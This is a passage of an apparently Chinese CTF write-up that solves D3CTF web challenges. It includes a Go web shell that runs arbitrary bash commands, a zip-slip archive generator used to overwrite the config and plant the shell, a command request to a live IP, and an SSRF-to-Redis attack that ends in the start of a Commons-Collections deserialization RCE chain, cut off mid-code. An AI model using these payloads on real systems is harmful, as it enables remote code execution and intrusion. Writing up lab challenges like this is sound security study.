<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	overseer.Run(overseer.Config&#123;</span><br><span class="line">		Program: prog,</span><br><span class="line">		Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">		&#125;</span><br><span class="line">		c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦†ç›–<code>config.yaml</code>é…ç½®çƒ­æ›´æ–°</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">noAdminLogin:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">database:</span></span><br><span class="line">  <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">3306</span></span><br><span class="line"><span class="attr">update:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">http://127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  <span class="attr">interval:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹ååˆ©ç”¨<code>controller.go</code>ä¸­<code>zipslip</code>æ¼æ´å»è¦†ç›–æ–‡ä»¶</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	uu := uuid.New()</span><br><span class="line"></span><br><span class="line">	zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String())) <span class="comment">//è§£å‹zipåˆ°ä¸€ä¸ªæ‹¼æ¥æœ‰uuidçš„æ–‡ä»¶è·¯å¾„,æ²¡æœ‰è¿›è¡Œå¤„ç†å­˜åœ¨zipslipæ¼æ´</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">		StatusCode: <span class="number">0</span>,</span><br><span class="line">		StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">		Data:       tree.Children,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆzip</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">#ç”Ÿæˆçš„zipæ–‡ä»¶</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;D:\\Floes\\ctf\\ceshi\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED) <span class="comment">#å‹ç¼©çš„æ–‡ä»¶å’Œåœ¨zipä¸­æ˜¾ç¤ºçš„æ–‡ä»¶å</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">#å‹ç¼©æ–‡ä»¶./shellåˆ°zipä¸­çš„../shell</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ åˆ°æœåŠ¡å™¨è®¿é—®shellè·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://139.196.153.122:31824/shell</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">cmd=env</span><br></pre></td></tr></table></figure>

<h1 id="d3icu"><a href="#d3icu" class="headerlink" title="d3icu"></a>d3icu</h1><h2 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h2><p>bot.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&quot;puppeteer&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/screenshot&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  (<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">timeout</span>: <span class="number">60000</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">setViewport</span>(&#123; <span class="attr">width</span>: <span class="number">1920</span>, <span class="attr">height</span>: <span class="number">1080</span> &#125;)</span><br><span class="line">      <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://127.0.0.1/demo/inedx.jsp&#x27;</span>, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">      <span class="keyword">const</span> buffer = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">        <span class="attr">encoding</span>: <span class="string">&quot;binary&quot;</span>,</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;png&quot;</span></span><br><span class="line">      &#125;)</span><br><span class="line">      res.<span class="title function_">set</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;image/png&quot;</span>)</span><br><span class="line">      res.<span class="title function_">send</span>(buffer)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(err.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8090</span>)</span><br></pre></td></tr></table></figure>

<p>main.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;hash/crc32&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/fs&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/flamego/flamego&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/go-redis/redis/v8&quot;</span></span><br><span class="line">	<span class="string">&quot;org.d3ctf.app/static&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crc32Hash</span><span class="params">(str <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> fmt.Sprint(crc32.ChecksumIEEE([]<span class="type">byte</span>(str)))	<span class="comment">//è¿”å›å­—èŠ‚æ•°ç»„çš„CRC32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	f := flamego.Classic()		<span class="comment">//flamegoæ¡†æ¶å®ä¾‹</span></span><br><span class="line">	f.Map(						<span class="comment">//é…ç½®å®ä¾‹ä¸­é—´ä»¶</span></span><br><span class="line">		Cache&#123;</span><br><span class="line">			client: redis.NewClient(&amp;redis.Options&#123;	<span class="comment">//NewClientç”Ÿæˆrediså®¢æˆ·ç«¯</span></span><br><span class="line">				Addr: os.ExpandEnv(<span class="string">&quot;127.0.0.1:6379&quot;</span>),<span class="comment">//é…ç½®redisé€‰é¡¹</span></span><br><span class="line">			&#125;),</span><br><span class="line">		&#125;,</span><br><span class="line">	)</span><br><span class="line">	staticFS, _ := fs.Sub(static.FS, <span class="string">&quot;dist&quot;</span>) <span class="comment">//ä»static.FSä¸­è·å–distå­æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">	f.Use(flamego.Static(flamego.StaticOptions&#123;<span class="comment">//åˆ›å»ºé™æ€æ–‡ä»¶ä¸­é—´ä»¶å¹¶è¿›è¡Œé™æ€æ–‡ä»¶ç³»ç»Ÿé…ç½®,ç”¨f.useæ·»åŠ åˆ°å®ä¾‹fä¸­</span></span><br><span class="line">		FileSystem: http.FS(staticFS),</span><br><span class="line">	&#125;))</span><br><span class="line">	f.Get(<span class="string">&quot;/fetch&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx flamego.Context, cache Cache, r *http.Request, rw http.ResponseWriter)</span></span> &#123;		<span class="comment">//ctxä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">		url := ctx.Query(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">		cacheKey := crc32Hash(url)</span><br><span class="line">         fmt.Println(cacheKey) <span class="comment">//æ’å…¥ä¸€ä¸ªè¾“å‡º</span></span><br><span class="line">		<span class="keyword">if</span> buf, err := cache.Get(r.Context(), cacheKey); err == <span class="literal">nil</span> &#123;<span class="comment">//ä»ç¼“å­˜è·å–cacheKeyå€¼å¹¶å†™å…¥å“åº”</span></span><br><span class="line">			ctx.ResponseWriter().Write(buf)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		resp, _ := http.Get(url)</span><br><span class="line">		buf, _ := io.ReadAll(resp.Body)</span><br><span class="line">		cache.Set(r.Context(), cacheKey, buf, time.Minute*<span class="number">10</span>)<span class="comment">//URLçš„CRCå€¼ä½œä¸ºé”®å,è¯·æ±‚è¿”å›æ•°æ®ä½œä¸ºé”®å€¼,æœ‰æ•ˆæ—¶é—´10min</span></span><br><span class="line">		rw.Write(buf)</span><br><span class="line">	&#125;)</span><br><span class="line">	f.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/go-redis/redis/v8&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Cache <span class="keyword">struct</span> &#123;</span><br><span class="line">	client *redis.Client</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cache)</span></span> Set(ctx context.Context, key <span class="type">string</span>, value []<span class="type">byte</span>, expire time.Duration) <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> c.client.Set(ctx, key, value, expire).Err()<span class="comment">//ä¸Šä¸‹æ–‡å¯¹è±¡,é”®å,é”®å€¼,æœ‰æ•ˆæ—¶é—´</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cache)</span></span> Get(ctx context.Context, key <span class="type">string</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> c.client.Get(ctx, key).Bytes()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TomcatæœåŠ¡ä¸­æœ‰ä¸ª</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230515215637466.png" alt="image-20230515215637466"></p>
<blockquote>
<p><code>tomcat-cluster-redis-session-manager</code>ä¼šä»rediså»é™¤é”®åä¸ºJSESSIONçš„å€¼ï¼Œç„¶åååºåˆ—åŒ–å®ƒï¼Œå¯¹åº”<code>tomcat.request.session.redis.SessionManager#findSession</code>æ–¹æ³•</p>
</blockquote>
<p><code>tomcat.request.session.redis.SessionManager</code>ä¸­çš„<code>findSession</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Session <span class="title function_">findSession</span><span class="params">(String sessionId)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (sessionId != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.sessionContext.get() != <span class="literal">null</span> &amp;&amp; sessionId.equals(((SessionContext)<span class="built_in">this</span>.sessionContext.get()).getId())) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((SessionContext)<span class="built_in">this</span>.sessionContext.get()).getSession();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isPersisted</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">SessionMetadata</span> <span class="variable">metadata</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="built_in">this</span>.dataCache.get(sessionId);</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            sessionId = <span class="literal">null</span>;</span><br><span class="line">            isPersisted = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.equals(SessionConstants.NULL_SESSION, data)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;NULL session data&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                metadata = <span class="keyword">new</span> <span class="title class_">SessionMetadata</span>();</span><br><span class="line">                <span class="type">Session</span> <span class="variable">newSession</span> <span class="operator">=</span> <span class="built_in">this</span>.createEmptySession();</span><br><span class="line">                <span class="built_in">this</span>.serializer.deserializeSessionData(data, newSession, metadata);</span><br><span class="line">                <span class="comment">//deserializeSessionDataååºåˆ—åŒ–</span></span><br><span class="line">                newSession.setId(sessionId);</span><br><span class="line">                newSession.access();</span><br><span class="line">                newSession.setNew(<span class="literal">false</span>);</span><br><span class="line">                newSession.setValid(<span class="literal">true</span>);</span><br><span class="line">                newSession.resetDirtyTracking();</span><br><span class="line">                newSession.setMaxInactiveInterval(<span class="built_in">this</span>.getSessionTimeout(newSession));</span><br><span class="line">                session = newSession;</span><br><span class="line">                isPersisted = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error occurred while de-serializing the session object..&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setValues(sessionId, session, isPersisted, metadata);</span><br><span class="line">        <span class="keyword">return</span> session;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>deserializeSessionData</code>è·Ÿè¿›</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230515224233898.png" alt="image-20230515224233898"></p>
<p>åœ¨ç¯å¢ƒä¸­ç»™äº†ccä¾èµ–,å¯ä»¥åœ¨redisç¼“å­˜ä¸­æŠ•å…¥æ¶æ„å­—èŠ‚ç è¿›è¡Œååºåˆ—åŒ–</p>
<h2 id="è§£é¢˜åˆ†æ"><a href="#è§£é¢˜åˆ†æ" class="headerlink" title="è§£é¢˜åˆ†æ"></a>è§£é¢˜åˆ†æ</h2><p>å…ˆè®©goå»ç¼“å­˜ä¸€ä¸‹æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶,è·å–ååºåˆ—åŒ–æ•°æ®å­˜å…¥redis,æˆ‘ä»¬æœ¬åœ°èµ·ä¸ªç¯å¢ƒè·å–CRCæ•°æ®,ç„¶åæŠŠJSESSIONIDæ”¹ä¸ºCRCçš„å€¼,é‚£ä¹ˆæˆ‘ä»¬åœ¨å‘åŒ…çš„æ—¶å€™å°±ä¼šè¿›è¡Œååºåˆ—åŒ–è§¦å‘RCE</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.d3ctf.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span 